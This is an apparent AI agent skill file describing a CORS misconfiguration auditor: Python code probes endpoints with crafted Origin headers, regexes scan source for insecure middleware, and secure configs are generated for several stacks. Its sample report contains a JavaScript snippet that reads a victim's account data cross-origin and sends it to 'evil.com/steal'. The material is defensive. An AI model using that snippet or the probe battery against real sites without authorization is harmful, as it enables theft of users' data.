---
name: phy-cors-audit
description: CORS (Cross-Origin Resource Sharing) misconfiguration auditor. Probes any API endpoint with crafted Origin headers to detect the most dangerous CORS vulnerabilities — reflecting arbitrary Origins (any attacker.com gets CORS approved), Access-Control-Allow-Credentials:true with wildcard ACAO, null-Origin allowed (iframe/file:// bypass), subdomain regex bypasses (evil.myapp.com passes), missing Vary:Origin (CDN cache poisoning), and permissive preflight responses. Also scans source code for insecure CORS middleware patterns (Express/FastAPI/Go/Rails/Django/Spring). Generates correct CORS configuration for your specific stack. Works against any live URL via curl — zero external API. Triggers on "CORS error", "CORS misconfiguration", "Access-Control-Allow-Origin", "cors policy", "preflight", "cors blocked", "/cors-audit".
license: Apache-2.0
homepage: https://canlah.ai
metadata:
  author: Canlah AI
  version: "1.0.2"
  tags:
    - security
    - cors
    - api-security
    - owasp
    - web-security
    - developer-tools
    - express
    - fastapi
    - static-analysis
    - http-headers
---

# CORS Audit

`Access to fetch at 'https://api.myapp.com' from origin 'https://evil.com' has been set with CORS policy: No 'Access-Control-Allow-Origin'`

Then you add `Access-Control-Allow-Origin: *` and it works. Except now your API accepts requests from every site on the internet, with every user's credentials, if you forgot to check the credentials flag.

This skill probes your CORS configuration with crafted Origin headers, finds the misconfigurations that let attackers run authenticated cross-origin requests against your users, and generates the correct allow-list config for your stack.

**Works against any live URL via curl. Scans Express/FastAPI/Go/Rails/Django source. Zero external API.**

---

## Trigger Phrases

- "CORS error", "CORS blocked", "CORS not working"
- "CORS misconfiguration", "cors security"
- "Access-Control-Allow-Origin", "ACAO"
- "cors policy", "preflight OPTIONS"
- "cors wildcard", "cors credentials"
- "/cors-audit"

---

## How to Provide Input

```bash
# Option 1: Probe a live API endpoint
/cors-audit https://api.myapp.com/users

# Option 2: Probe with specific origin
/cors-audit https://api.myapp.com --origin https://evil.com

# Option 3: Full probe battery (all known bypasses)
/cors-audit https://api.myapp.com --full

# Option 4: Scan source code for CORS misconfigurations
/cors-audit --scan src/

# Option 5: Generate correct CORS config for your stack
/cors-audit --generate express --allowed-origins https://myapp.com,https://staging.myapp.com

# Option 6: CI mode (exit 1 on critical findings)
/cors-audit https://api.myapp.com --ci

# Option 7: Audit multiple endpoints at once
/cors-audit --endpoints /api/users,/api/orders,/api/admin --base https://api.myapp.com
```

---

## Step 1: Probe CORS Configuration

```python
import subprocess
import re
from dataclasses import dataclass, field
from typing import Optional
from urllib.parse import urlparse


@dataclass
class CorsProbeResult:
    probe_name: str
    origin_sent: str
    acao: Optional[str]          # Access-Control-Allow-Origin
    acac: Optional[str]          # Access-Control-Allow-Credentials
    acam: Optional[str]          # Access-Control-Allow-Methods
    acah: Optional[str]          # Access-Control-Allow-Headers
    vary: Optional[str]          # Vary header
    status_code: int
    is_vulnerable: bool
    severity: str
    issue: str
    fix: str


def probe_cors(url: str, origin: str, method: str = 'GET') -> dict:
    """Send a single CORS probe and return response headers."""
    result = subprocess.run(
        ['curl', '-sI', '-X', method, url,
         '-H', f'Origin: {origin}',
         '-H', 'Content-Type: application/json',
         '--max-time', '10',
         '--user-agent', 'CorsAuditor/1.0'],
        capture_output=True, text=True
    )
    headers = {}
    status_code = 200
    for line in result.stdout.splitlines():
        if line.startswith('HTTP/'):
            try:
                status_code = int(line.split()[1])
            except (IndexError, ValueError):
                pass
        elif ':' in line:
            key, _, value = line.partition(':')
            headers[key.strip().lower()] = value.strip()
    return {'headers': headers, 'status_code': status_code, 'raw': result.stdout}


def run_cors_battery(url: str) -> list[CorsProbeResult]:
    """
    Run the full battery of CORS probes against a URL.
    Tests all known CORS misconfiguration patterns.
    """
    parsed = urlparse(url)
    base_domain = parsed.netloc  # e.g. api.myapp.com

    # Derive legitimate origin (for baseline)
    legitimate_origin = f'{parsed.scheme}://{base_domain.replace("api.", "")}'

    # Build the probe set
    probes = [
        {
            'name': 'arbitrary_origin_evil',
            'origin': 'https://evil.com',
            'description': 'Random attacker origin',
        },
        {
            'name': 'null_origin',
            'origin': 'null',
            'description': 'null origin (file://, sandboxed iframe)',
        },
        {
            'name': 'subdomain_bypass',
            'origin': f'https://evil.{base_domain}',
            'description': f'Subdomain of target: evil.{base_domain}',
        },
        {
            'name': 'prefix_bypass',
            'origin': f'https://{base_domain}.evil.com',
            'description': f'Domain that contains target as prefix: {base_domain}.evil.com',
        },
        {
            'name': 'http_downgrade',
            'origin': f'http://{base_domain}',
            'description': f'HTTP version of same domain: http://{base_domain}',
        },
        {
            'name': 'legitimate_origin',
            'origin': legitimate_origin,
            'description': f'Legitimate origin: {legitimate_origin}',
        },
        {
            'name': 'wildcard_check',
            'origin': 'https://completely-unrelated.com',
            'description': 'Completely unrelated domain',
        },
    ]

    results = []

    for probe in probes:
        resp = probe_cors(url, probe['origin'])
        headers = resp['headers']
        acao = headers.get('access-control-allow-origin')
        acac = headers.get('access-control-allow-credentials', '').lower()
        vary = headers.get('vary', '')

        # Analyze the response
        is_vulnerable = False
        severity = 'INFO'
        issue = ''
        fix = ''

        if not acao:
            # No CORS headers — either not configured or blocked
            if probe['name'] == 'legitimate_origin':
                issue = 'No CORS headers returned for legitimate origin'
                severity = 'INFO'
            else:
                issue = 'Request blocked (no ACAO header) ✅'
                severity = 'PASS'
        elif acao == '*':
            if acac == 'true':
                # IMPOSSIBLE combination per spec, but some servers misconfigure this
                is_vulnerable = True
                severity = 'CRITICAL'
                issue = 'Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true — browsers reject this, but some HTTP clients do not'
                fix = 'Never use wildcard with credentials. Specify exact origins: Access-Control-Allow-Origin: https://myapp.com'
            else:
                if probe['name'] in ('arbitrary_origin_evil', 'wildcard_check'):
                    severity = 'HIGH'
                    is_vulnerable = True
                    issue = 'Wildcard ACAO (*) — any origin can make unauthenticated cross-origin requests'
                    fix = 'Replace * with an explicit allowlist. Wildcard is safe only for fully public, unauthenticated APIs.'
                else:
                    severity = 'MEDIUM'
                    issue = 'Wildcard ACAO — acceptable only if API requires no authentication'
                    fix = 'Confirm this endpoint has no authentication. If it does, restrict ACAO to specific origins.'
        elif acao == probe['origin']:
            # Origin is reflected — check if this is intentional
            if probe['name'] == 'legitimate_origin':
                severity = 'PASS'
                issue = f'Origin correctly reflected for legitimate origin ✅'
                # Check for Vary: Origin
                if 'origin' not in vary.lower():
                    severity = 'MEDIUM'
                    is_vulnerable = True
                    issue = 'ACAO reflects Origin but Vary: Origin missing — CDN/proxy may cache and serve wrong CORS response'
                    fix = 'Add Vary: Origin header whenever ACAO is dynamically set'
            elif probe['name'] == 'null_origin':
                is_vulnerable = True
                severity = 'HIGH'
                issue = 'null Origin is allowed — attackers can bypass CORS from sandboxed iframes or file:// pages'
                fix = 'Remove null from your CORS allowlist. null origin is never legitimate from a web application.'
            elif probe['name'] == 'arbitrary_origin_evil':
                is_vulnerable = True
                severity = 'CRITICAL'
                issue = 'Server reflects ANY Origin in ACAO — any website can make cross-origin requests as your users'
                fix = (
                    'Replace origin reflection with an explicit allowlist check:\n'
                    '  const allowed = ["https://myapp.com", "https://staging.myapp.com"];\n'
                    '  if (allowed.includes(req.headers.origin)) {\n'
                    '    res.setHeader("Access-Control-Allow-Origin", req.headers.origin);\n'
                    '  }'
                )
            elif probe['name'] == 'subdomain_bypass':
                is_vulnerable = True
                severity = 'HIGH'
                issue = f'Subdomain "{probe["origin"]}" is allowed — regex/suffix match is too permissive'
                fix = 'Use exact string comparison, not endsWith() or regex match. evil.myapp.com ≠ myapp.com.'
            elif probe['name'] == 'prefix_bypass':
                is_vulnerable = True
                severity = 'HIGH'
                issue = f'Prefix match allows "{probe["origin"]}" — regex startsWith match is too permissive'
                fix = 'Do not use startsWith() for origin validation. Use an explicit exact-match allowlist.'
            elif probe['name'] == 'http_downgrade':
                is_vulnerable = True
                severity = 'MEDIUM'
                issue = f'HTTP version of your domain is allowed — enables MitM + CORS bypass'
                fix = 'Only allow HTTPS origins. Remove http:// variants from your CORS allowlist.'
        else:
            # ACAO is a fixed value that doesn't match probe origin — correctly blocked
            issue = f'Request correctly blocked (ACAO: {acao}) ✅'
            severity = 'PASS'

        results.append(CorsProbeResult(
            probe_name=probe['name'],
            origin_sent=probe['origin'],
            acao=acao,
            acac=headers.get('access-control-allow-credentials'),
            acam=headers.get('access-control-allow-methods'),
            acah=headers.get('access-control-allow-headers'),
            vary=vary,
            status_code=resp['status_code'],
            is_vulnerable=is_vulnerable,
            severity=severity,
            issue=issue,
            fix=fix,
        ))

    return results


def probe_preflight(url: str, origin: str = 'https://evil.com') -> CorsProbeResult:
    """Test OPTIONS preflight response."""
    resp = probe_cors(url, origin, method='OPTIONS')
    headers = resp['headers']
    acao = headers.get('access-control-allow-origin')
    acam = headers.get('access-control-allow-methods', '')
    acah = headers.get('access-control-allow-headers', '')

    is_vulnerable = False
    severity = 'INFO'
    issue = ''
    fix = ''

    if acao == '*' or acao == origin:
        if 'delete' in acam.lower() or 'put' in acam.lower() or 'patch' in acam.lower():
            is_vulnerable = True
            severity = 'HIGH'
            issue = f'Preflight allows mutating methods ({acam}) from untrusted origins'
            fix = 'Restrict Access-Control-Allow-Methods to only GET, POST for public origins. Require auth for write methods.'
        if 'authorization' in acah.lower() and (acao == '*' or acao == 'https://evil.com'):
            is_vulnerable = True
            severity = 'HIGH'
            issue = 'Preflight allows Authorization header from untrusted origin — credential forwarding enabled'
            fix = 'Only allow Authorization header from your specific trusted origins.'

    return CorsProbeResult(
        probe_name='preflight',
        origin_sent=origin,
        acao=acao, acac=None, acam=acam, acah=acah, vary=headers.get('vary', ''),
        status_code=resp['status_code'],
        is_vulnerable=is_vulnerable, severity=severity, issue=issue, fix=fix,
    )
```

---

## Step 2: Scan Source Code for CORS Misconfigurations

```python
import re
import glob
from pathlib import Path

SKIP_DIRS = {'node_modules', '.git', 'dist', 'build', '__pycache__',
             '.next', 'vendor', 'venv', '.venv'}

CODE_PATTERNS = [

    # Express cors() with no options = allow all origins
    {
        'name': 'EXPRESS_CORS_NO_OPTIONS',
        'pattern': re.compile(r'app\.use\s*\(\s*cors\s*\(\s*\)\s*\)', re.I),
        'severity': 'HIGH',
        'message': 'cors() with no options — allows ANY origin',
        'fix': (
            "app.use(cors({\n"
            "  origin: ['https://myapp.com', 'https://staging.myapp.com'],\n"
            "  credentials: true,\n"
            "}));"
        ),
    },

    # origin: '*' with credentials
    {
        'name': 'WILDCARD_WITH_CREDENTIALS',
        'pattern': re.compile(r"origin\s*:\s*['\"]?\*['\"]?", re.I),
        'check': lambda line, ctx: 'credentials' in ctx and 'true' in ctx,
        'severity': 'CRITICAL',
        'message': "origin: '*' with credentials: true — insecure combination",
        'fix': "Use explicit origin allowlist with credentials, never wildcard.",
    },

    # Reflecting req.headers.origin without allowlist check
    {
        'name': 'ORIGIN_REFLECTION',
        'pattern': re.compile(
            r'(?:Access-Control-Allow-Origin|ACAO)\s*[=:,]\s*req\.(?:headers?\.origin|get\([\'"]origin)',
            re.I
        ),
        'severity': 'CRITICAL',
        'message': 'Directly reflecting req.headers.origin without allowlist check',
        'fix': (
            "const ALLOWED = new Set(['https://myapp.com']);\n"
            "const origin = req.headers.origin;\n"
            "if (ALLOWED.has(origin)) res.setHeader('Access-Control-Allow-Origin', origin);"
        ),
    },

    # Python: CORS_ORIGINS = "*" or origins="*"
    {
        'name': 'PYTHON_CORS_WILDCARD',
        'pattern': re.compile(
            r'(?:CORS_ORIGINS|allow_origins|origins)\s*[=:]\s*["\'\[]\s*["\']?\*["\']?',
            re.I
        ),
        'severity': 'HIGH',
        'message': 'Python CORS wildcard origin — allows requests from any website',
        'fix': "allow_origins=['https://myapp.com', 'https://staging.myapp.com']",
    },

    # Go: AllowAllOrigins: true
    {
        'name': 'GO_ALLOW_ALL_ORIGINS',
        'pattern': re.compile(r'AllowAllOrigins\s*:\s*true', re.I),
        'severity': 'HIGH',
        'message': 'AllowAllOrigins: true in Go CORS config',
        'fix': "Replace with AllowOrigins: []string{\"https://myapp.com\"}",
    },

    # Rails: origins '*'
    {
        'name': 'RAILS_CORS_WILDCARD',
        'pattern': re.compile(r"origins\s+['\"]?\*['\"]?", re.I),
        'severity': 'HIGH',
        'message': "Rails cors: origins '*' — any domain allowed",
        'fix': "origins 'https://myapp.com', 'https://staging.myapp.com'",
    },

    # Spring: @CrossOrigin without origins
    {
        'name': 'SPRING_CROSSORIGIN_ANY',
        'pattern': re.compile(r'@CrossOrigin\s*(?!\s*\(origins)', re.I),
        'severity': 'HIGH',
        'message': '@CrossOrigin with no origins specified — defaults to all origins (*)',
        'fix': '@CrossOrigin(origins = "https://myapp.com")',
    },

    # Django: CORS_ALLOW_ALL_ORIGINS = True
    {
        'name': 'DJANGO_CORS_ALL',
        'pattern': re.compile(r'CORS_ALLOW_ALL_ORIGINS\s*=\s*True', re.I),
        'severity': 'HIGH',
        'message': 'Django CORS_ALLOW_ALL_ORIGINS = True — allows requests from any website',
        'fix': (
            "CORS_ALLOW_ALL_ORIGINS = False\n"
            "CORS_ALLOWED_ORIGINS = ['https://myapp.com']"
        ),
    },

    # endsWith / includes check for origin (bypassable)
    {
        'name': 'CORS_ENDSWITH_CHECK',
        'pattern': re.compile(
            r'origin\s*(?:&&)?\s*origin\.(?:endsWith|includes|indexOf|match)',
            re.I
        ),
        'severity': 'HIGH',
        'message': 'Origin check using endsWith/includes — bypassable with evil.myapp.com or myapp.com.evil.com',
        'fix': (
            "Use exact Set membership:\n"
            "  const ALLOWED = new Set(['https://myapp.com']);\n"
            "  if (ALLOWED.has(origin)) { // safe exact match }"
        ),
    },
]


def scan_cors_code(src_dir: str = '.') -> list[dict]:
    """Scan source files for insecure CORS patterns."""
    findings = []

    for ext in ['.js', '.ts', '.jsx', '.tsx', '.py', '.go', '.java', '.rb']:
        for fpath in glob.glob(f'{src_dir}/**/*{ext}', recursive=True):
            if any(skip in fpath for skip in SKIP_DIRS):
                continue
            try:
                content = Path(fpath).read_text(errors='replace')
                lines = content.splitlines()
            except Exception:
                continue

            for i, line in enumerate(lines, 1):
                for p in CODE_PATTERNS:
                    if p['pattern'].search(line):
                        ctx_start = max(0, i - 3)
                        ctx_end = min(len(lines), i + 8)
                        context = '\n'.join(lines[ctx_start:ctx_end])

                        check_fn = p.get('check')
                        if check_fn and not check_fn(line, context):
                            continue

                        findings.append({
                            'file': fpath,
                            'line': i,
                            'code': line.strip()[:120],
                            'name': p['name'],
                            'severity': p['severity'],
                            'message': p['message'],
                            'fix': p['fix'],
                        })

    return findings
```

---

## Step 3: Generate Correct CORS Config

```python
def generate_cors_config(
    allowed_origins: list[str],
    allow_credentials: bool = True,
    allowed_methods: list[str] = None,
    allowed_headers: list[str] = None,
    stack: str = 'express',
) -> str:
    """Generate secure CORS configuration for the specified stack."""

    methods = allowed_methods or ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS']
    headers = allowed_headers or ['Content-Type', 'Authorization']
    origins_list = ', '.join(f'"{o}"' for o in allowed_origins)

    configs = {
        'express': f'''// Express.js (npm install cors)
const cors = require('cors');

const ALLOWED_ORIGINS = new Set([{origins_list}]);

app.use(cors({{
  origin: (origin, callback) => {{
    // Allow requests with no origin (server-to-server, curl)
    if (!origin || ALLOWED_ORIGINS.has(origin)) {{
      callback(null, true);
    }} else {{
      callback(new Error(`Origin ${{origin}} not allowed by CORS`));
    }}
  }},
  credentials: {str(allow_credentials).lower()},
  methods: {methods},
  allowedHeaders: {headers},
}}));

// Always respond to preflight
app.options('*', cors());''',

        'fastapi': f'''# FastAPI (pip install fastapi)
from fastapi.middleware.cors import CORSMiddleware

ALLOWED_ORIGINS = [{", ".join(f'"{o}"' for o in allowed_origins)}]

app.add_middleware(
    CORSMiddleware,
    allow_origins=ALLOWED_ORIGINS,
    allow_credentials={str(allow_credentials)},
    allow_methods={methods},
    allow_headers={headers},
)''',

        'nginx': f'''# nginx — add to server block
map $http_origin $cors_origin {{
  default "";
{chr(10).join(f'  "{o}" "{o}";' for o in allowed_origins)}
}}

server {{
  # ... your existing config ...

  location /api/ {{
    if ($cors_origin != "") {{
      add_header Access-Control-Allow-Origin $cors_origin always;
      add_header Access-Control-Allow-Credentials {str(allow_credentials).lower()} always;
      add_header Access-Control-Allow-Methods "{", ".join(methods)}" always;
      add_header Access-Control-Allow-Headers "{", ".join(headers)}" always;
      add_header Vary Origin always;
    }}

    # Handle preflight
    if ($request_method = OPTIONS) {{
      add_header Access-Control-Max-Age 86400;
      return 204;
    }}
  }}
}}''',

        'go': f'''// Go (github.com/gin-contrib/cors or net/http)
import "github.com/gin-contrib/cors"

allowedOrigins := []string{{{", ".join(f'"{o}"' for o in allowed_origins)}}}

config := cors.Config{{
    AllowOrigins:     allowedOrigins,
    AllowMethods:     []string{{{", ".join(f'"{m}"' for m in methods)}}},
    AllowHeaders:     []string{{{", ".join(f'"{h}"' for h in headers)}}},
    AllowCredentials: {str(allow_credentials).lower()},
    ExposeHeaders:    []string{{}},
    MaxAge:           12 * time.Hour,
}}
router.Use(cors.New(config))''',

        'django': f'''# Django (pip install django-cors-headers)
# settings.py
INSTALLED_APPS = [
    ...
    "corsheaders",
]

MIDDLEWARE = [
    "corsheaders.middleware.CorsMiddleware",
    "django.middleware.common.CommonMiddleware",
    ...
]

CORS_ALLOW_ALL_ORIGINS = False
CORS_ALLOWED_ORIGINS = [{", ".join(f'"{o}"' for o in allowed_origins)}]
CORS_ALLOW_CREDENTIALS = {str(allow_credentials)}
CORS_ALLOW_METHODS = {methods}
CORS_ALLOW_HEADERS = {headers}''',
    }

    return configs.get(stack, configs['express'])
```

---

## Step 4: Output Report

```markdown
## CORS Security Audit
Target: https://api.myapp.com | Probes: 7 | Source scan: src/

---

### Probe Results

| Probe | Origin Sent | ACAO Returned | Credentials | Verdict |
|-------|-------------|---------------|-------------|---------|
| Arbitrary evil | https://evil.com | `https://evil.com` | true | 🔴 CRITICAL |
| null origin | null | null | true | 🔴 HIGH |
| Subdomain bypass | https://evil.api.myapp.com | `https://evil.api.myapp.com` | true | 🔴 HIGH |
| Prefix bypass | https://api.myapp.com.evil.com | Not reflected | — | ✅ PASS |
| HTTP downgrade | http://api.myapp.com | `http://api.myapp.com` | true | 🟠 MEDIUM |
| Legitimate origin | https://myapp.com | `https://myapp.com` | true | ✅ PASS |
| Preflight OPTIONS | https://evil.com | `https://evil.com` | — | 🔴 HIGH |

---

### 🔴 CRITICAL — Origin Reflection (any attacker can impersonate users)

**Root cause in `src/middleware/cors.ts:8`:**
```ts
res.setHeader('Access-Control-Allow-Origin', req.headers.origin)
res.setHeader('Access-Control-Allow-Credentials', 'true')
```

This reflects ANY origin — with credentials. An attacker on evil.com can load:
```html
<script>
fetch('https://api.myapp.com/api/account', { credentials: 'include' })
  .then(r => r.json())
  .then(data => fetch('https://evil.com/steal?d=' + JSON.stringify(data)))
</script>
```
A logged-in user who visits evil.com will have their account data sent to the attacker.

**Fix:**
```ts
const ALLOWED_ORIGINS = new Set(['https://myapp.com', 'https://staging.myapp.com']);

app.use((req, res, next) => {
  const origin = req.headers.origin;
  if (origin && ALLOWED_ORIGINS.has(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
    res.setHeader('Vary', 'Origin');
  }
  next();
});
```

---

### 🔴 HIGH — null Origin Allowed

**Verified:** `curl -H "Origin: null"` returns `Access-Control-Allow-Origin: null`

null is granted by browsers to:
- `<iframe sandbox>` without `allow-same-origin`
- `file://` pages
- Some data: URIs

An attacker can host a sandboxed iframe that makes authenticated requests to your API.

**Fix:** Never include `null` in your origin allowlist.

---

### 🔴 HIGH — Subdomain Bypass

`evil.api.myapp.com` is allowed because your check uses `origin.endsWith('.myapp.com')`.
An attacker can register `evil.api.myapp.com` (if the subdomain isn't protected by your DNS).

**Fix:** Replace with exact allowlist (see generated config below).

---

### Generated Secure CORS Config (Express.js)

```ts
const ALLOWED_ORIGINS = new Set([
  'https://myapp.com',
  'https://staging.myapp.com',
]);

app.use(cors({
  origin: (origin, callback) => {
    if (!origin || ALLOWED_ORIGINS.has(origin)) {
      callback(null, true);
    } else {
      callback(new Error(`Origin ${origin} not allowed by CORS`));
    }
  },
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization'],
}));

app.options('*', cors()); // handle preflight
```

**Also add `Vary: Origin`** to prevent CDN caching the wrong ACAO response:
```ts
app.use((req, res, next) => {
  res.setHeader('Vary', 'Origin');
  next();
});
```

---

### CORS Decision Tree (Reference)

```
Does the API serve public data with no authentication?
  YES → Access-Control-Allow-Origin: *  (safe, no credentials)
  NO  → Use explicit allowlist + credentials:true + Vary:Origin

Does any endpoint need cross-origin auth (cookies/Authorization)?
  YES → Exact allowlist only. Never wildcard with credentials.
  NO  → Wildcard is acceptable for that endpoint

Are you using a CDN or reverse proxy?
  YES → Add Vary: Origin header (prevents cached ACAO poisoning)
  NO  → Still add Vary: Origin (best practice)
```
```

---

## Quick Mode Output

```
CORS Audit: https://api.myapp.com

🔴 CRITICAL: Origin reflection (any origin gets CORS + credentials)
🔴 HIGH: null origin allowed (iframe sandbox bypass)
🔴 HIGH: Subdomain bypass (evil.api.myapp.com passes endsWith check)
🟠 MEDIUM: HTTP origin allowed (http://api.myapp.com)
✅ Prefix bypass blocked

Root cause: cors.ts:8 reflects req.headers.origin without allowlist check
Fix: Replace with Set(['https://myapp.com']).has(origin) check
Generated config: Express / nginx / FastAPI / Go / Django available
```

---

## Author

**[Canlah AI](https://canlah.ai)** — Run performance marketing without breaking your brand.

- GitHub: [github.com/PHY041](https://github.com/PHY041)
- All Skills: [clawhub.ai/PHY041](https://clawhub.ai/PHY041)
